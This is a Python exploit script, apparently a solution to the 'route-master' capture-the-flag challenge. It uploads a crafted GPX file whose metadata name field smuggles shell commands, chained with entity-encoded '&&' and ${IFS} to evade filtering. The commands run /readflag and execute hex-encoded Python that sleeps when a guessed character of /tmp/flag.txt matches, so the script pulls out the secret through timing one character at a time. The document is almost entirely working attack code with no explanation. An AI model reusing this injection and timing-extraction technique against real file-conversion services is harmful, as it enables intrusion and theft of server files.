#!/usr/bin/env python3
import requests
import string

HOST = "http://449e7efaf2997c0a.route-master.challs.nazionale.olicyber.it/"

solve = '''<?xml version="1.0" encoding="UTF-8" standalone="no" ?>
<gpx xmlns="http://www.topografix.com/GPX/1/1" xmlns:gpxx="http://www.garmin.com/xmlschemas/GpxExtensions/v3" xmlns:gpxtpx="http://www.garmin.com/xmlschemas/TrackPointExtension/v1" creator="Oregon 400t" version="1.1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.topografix.com/GPX/1/1 http://www.topografix.com/GPX/1/1/gpx.xsd http://www.garmin.com/xmlschemas/GpxExtensions/v3 http://www.garmin.com/xmlschemas/GpxExtensionsv3.xsd http://www.garmin.com/xmlschemas/TrackPointExtension/v1 http://www.garmin.com/xmlschemas/TrackPointExtensionv1.xsd">
  <metadata>
    <name>{a}</name>
    <time>2016-06-17T23:41:03Z</time>
  </metadata>
  <trk>
    <name>Example GPX Document</name>
    <trkseg>
      <trkpt lat="47.644548" lon="-122.326897">
        <ele>4.46</ele>
        <time>2009-10-17T18:37:26Z</time>
      </trkpt>
      <trkpt lat="47.644548" lon="-122.326897">
        <ele>4.94</ele>
        <time>2009-10-17T18:37:31Z</time>
      </trkpt>
      <trkpt lat="47.644548" lon="-122.326897">
        <ele>6.87</ele>
        <time>2009-10-17T18:37:34Z</time>
      </trkpt>
    </trkseg>
  </trk>
</gpx>
'''

aa = '&amp;'
gt = '&gt;'

python = '''
import time
f = open("/tmp/flag.txt").read()
if f[{i}] == '{c}':
    time.sleep(3)
'''.strip()

flag = 'flag{b3_c4r3ful_w1th_'
while not flag.endswith('}'):
    for c in string.printable:
        py = python.format(i=len(flag), c=c)
        script = ('roba.json' + 
            (aa * 2) + f'/readflag{gt}/tmp/flag.txt' + 
            (aa * 2) + f'python${{IFS}}-c${{IFS}}&quot;exec(bytes.fromhex(&apos;{py.encode().hex()}&apos;).decode())&quot;' +
            (aa * 2) + f'/readflag{gt}/tmp/roba'
        )
        st = solve.format(a=script)

        with open("palle.gpx", "wb") as p:
            p.write(st.encode())

        r = requests.post(HOST + "/convert", files={
            "file": ("solve.gpx", open("palle.gpx", "rb"), 'application/gpx+xml')
        })
        if r.elapsed.total_seconds() > 2:
            flag += c
            print(flag)
            break
        else:
            print("no", c, r.elapsed.total_seconds())
print(flag)